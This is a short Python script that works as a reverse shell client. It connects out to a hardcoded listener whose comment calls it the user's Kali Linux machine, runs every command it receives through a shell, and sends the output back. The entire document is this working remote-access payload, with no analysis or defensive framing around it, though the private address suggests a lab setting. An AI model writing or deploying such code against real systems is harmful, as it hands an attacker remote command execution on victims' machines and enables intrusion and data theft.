import socket
import subprocess
import os

def main():
    target_host = "192.168.10.196"  # Replace with the IP address of your Kali Linux machine
    target_port = 9024  # Replace with the port number used by the server

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))

    while True:
        command = client.recv(4096).decode("utf-8")  # Receive the command from the server

        if command.strip().lower() == 'quit':
            break

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = result.stdout + result.stderr

        client.send(response.encode("utf-8"))  # Send the command output back to the server

    client.close()

if __name__ == "__main__":
    main()
